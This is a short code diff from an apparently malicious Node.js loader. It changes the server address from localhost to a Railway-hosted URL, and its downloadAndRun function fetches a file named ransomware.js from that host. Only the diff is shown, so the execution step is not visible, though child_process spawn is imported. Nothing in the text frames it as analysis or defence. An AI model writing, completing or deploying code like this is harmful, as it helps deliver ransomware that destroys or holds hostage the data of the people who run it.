@@ -9,7 +9,7 @@ const { spawn } = require('child_process');
 const os = require('os');
 
 // ⚠️ UPDATE THIS TO YOUR RAILWAY URL AFTER DEPLOY ⚠️
-const SERVER_URL = 'http://localhost:3001'; // <- CHANGE THIS!
+const SERVER_URL = 'https://crimson-production-d9ad.up.railway.app';
 
 function downloadAndRun() {
     const url = SERVER_URL + '/download/ransomware.js';
